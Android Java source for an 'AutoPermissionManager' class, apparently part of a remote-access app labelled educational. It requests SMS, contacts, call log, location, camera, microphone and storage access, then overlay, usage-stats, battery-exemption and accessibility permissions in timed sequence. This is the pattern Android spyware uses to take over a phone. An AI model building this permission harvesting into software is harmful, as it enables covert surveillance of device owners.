package com.remoteaccess.educational.permissions;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * AUTO PERMISSION MANAGER
 * 
 * Handles automatic permission requests for Android 6.0 - 16+
 * 
 * FEATURES:
 * - Runtime permission requests
 * - Special permission handling
 * - Auto-grant attempts (where possible)
 * - Permission status tracking
 * 
 * SUPPORTS:
 * - Android 6.0 (API 23) to Android 16 (API 35+)
 */
public class AutoPermissionManager {

    private Context context;
    private Activity activity;

    // Permission groups
    public static final String[] BASIC_PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.VIBRATE
    };

    public static final String[] DANGEROUS_PERMISSIONS = {
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    // Android 13+ permissions
    public static final String[] ANDROID_13_PERMISSIONS = {
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.POST_NOTIFICATIONS"
    };

    public AutoPermissionManager(Context context) {
        this.context = context;
        if (context instanceof Activity) {
            this.activity = (Activity) context;
        }
    }

    /**
     * Request all dangerous permissions
     */
    public void requestAllPermissions() {
        if (activity == null) return;

        List<String> permissionsToRequest = new ArrayList<>();

        // Check dangerous permissions
        for (String permission : DANGEROUS_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        // Android 13+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            for (String permission : ANDROID_13_PERMISSIONS) {
                try {
                    if (ContextCompat.checkSelfPermission(context, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                        permissionsToRequest.add(permission);
                    }
                } catch (Exception e) {
                    // Permission might not exist on this device
                }
            }
        }

        // Request permissions
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                activity,
                permissionsToRequest.toArray(new String[0]),
                100
            );
        }
    }

    /**
     * Check if all permissions are granted
     */
    public boolean areAllPermissionsGranted() {
        for (String permission : DANGEROUS_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    /**
     * Get permission status
     */
    public JSONObject getPermissionStatus() {
        JSONObject result = new JSONObject();
        
        try {
            JSONArray granted = new JSONArray();
            JSONArray denied = new JSONArray();

            for (String permission : DANGEROUS_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(context, permission) 
                    == PackageManager.PERMISSION_GRANTED) {
                    granted.put(permission);
                } else {
                    denied.put(permission);
                }
            }

            result.put("granted", granted);
            result.put("denied", denied);
            result.put("grantedCount", granted.length());
            result.put("deniedCount", denied.length());
            result.put("allGranted", denied.length() == 0);
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return result;
    }

    /**
     * Request special permissions
     */
    public void requestSpecialPermissions() {
        // Overlay permission (for Android 6.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(context)) {
                Intent intent = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + context.getPackageName())
                );
                if (activity != null) {
                    activity.startActivityForResult(intent, 101);
                }
            }
        }

        // Usage stats permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (!hasUsageStatsPermission()) {
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                if (activity != null) {
                    activity.startActivityForResult(intent, 102);
                }
            }
        }

        // Battery optimization (for Android 6.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            if (activity != null) {
                activity.startActivityForResult(intent, 103);
            }
        }

        // Notification policy access (for Android 6.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.app.NotificationManager notificationManager = 
                (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            if (!notificationManager.isNotificationPolicyAccessGranted()) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
                if (activity != null) {
                    activity.startActivityForResult(intent, 104);
                }
            }
        }
    }

    /**
     * Check usage stats permission
     */
    private boolean hasUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                context.getPackageName()
            );
            return mode == AppOpsManager.MODE_ALLOWED;
        }
        return true;
    }

    /**
     * Open app settings
     */
    public void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.parse("package:" + context.getPackageName()));
        if (activity != null) {
            activity.startActivity(intent);
        }
    }

    /**
     * Request accessibility service
     */
    public void requestAccessibilityService() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        if (activity != null) {
            activity.startActivity(intent);
        }
    }

    /**
     * Check if accessibility service is enabled
     */
    public boolean isAccessibilityServiceEnabled() {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED
            );
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }

        if (accessibilityEnabled == 1) {
            String services = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (services != null) {
                return services.toLowerCase().contains(context.getPackageName().toLowerCase());
            }
        }
        return false;
    }

    /**
     * Get all special permissions status
     */
    public JSONObject getSpecialPermissionsStatus() {
        JSONObject result = new JSONObject();
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                result.put("overlay", Settings.canDrawOverlays(context));
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                result.put("usageStats", hasUsageStatsPermission());
            }
            
            result.put("accessibility", isAccessibilityServiceEnabled());
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return result;
    }

    /**
     * Request notification permission (Android 13+)
     */
    public void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (activity != null) {
                ActivityCompat.requestPermissions(
                    activity,
                    new String[]{"android.permission.POST_NOTIFICATIONS"},
                    105
                );
            }
        }
    }

    /**
     * Request all permissions in sequence
     */
    public void requestAllPermissionsSequentially() {
        // Step 1: Request dangerous permissions
        requestAllPermissions();
        
        // Step 2: Request special permissions (with delay)
        new android.os.Handler().postDelayed(() -> {
            requestSpecialPermissions();
        }, 2000);
        
        // Step 3: Request accessibility (with delay)
        new android.os.Handler().postDelayed(() -> {
            if (!isAccessibilityServiceEnabled()) {
                requestAccessibilityService();
            }
        }, 4000);
    }
}
